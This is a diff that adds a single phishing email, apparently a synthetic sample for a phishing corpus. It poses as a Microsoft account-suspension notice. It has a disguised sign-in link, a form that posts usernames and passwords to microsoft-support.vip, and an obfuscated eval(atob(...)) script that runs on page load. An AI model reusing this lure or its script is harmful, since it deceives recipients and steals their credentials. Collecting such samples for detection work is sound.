@@ -1,0 +1,34 @@
+From: notice@microsoft-support.vip
+To: victim40@example.com
+Subject: Your account has been suspended - immediate action required
+Date: Tue, 23 Mar 2002 11:11:00 -0500
+Message-ID: <phish-40-7064bf88-62f0-4aa4-b686-af315167a7b2@microsoft-support.vip>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 06 Mar 2002 16:13:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 19 Mar 2002 10:59:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 03 Mar 2002 07:41:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 06 Mar 2002 23:30:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 20 Mar 2002 17:05:00 -0500
+Received: from relay5 (relay5.example.net [192.0.2.105]) by mx5.example.com; Tue, 12 Mar 2002 22:35:00 -0500
+Received: from relay6 (relay6.example.net [192.0.2.106]) by mx6.example.com; Tue, 09 Mar 2002 09:30:00 -0500
+Return-Path: <bounce@mail-b23aff1f.top>
+Reply-To: recovery0@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-b23aff1f.top; dkim=fail header.d=microsoft-support.vip; dmarc=fail header.from=microsoft-support.vip
+Received-SPF: fail (mx.example.com: domain of notice@microsoft-support.vip does not designate 198.51.100.24 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=microsoft-support.vip; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-40-338daefb"
+
+--bnd-p-40-338daefb
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://microsoft-support.vip/login
+
+Reference: PAB03A8
+--bnd-p-40-338daefb
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://microsoft-support.vip/login<br/><br/>Reference: PAB03A8</p><p><a href="http://microsoft-support.vip/login">https://www.microsoft.com/signin</a></p><form action="http://microsoft-support.vip/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-40-338daefb--
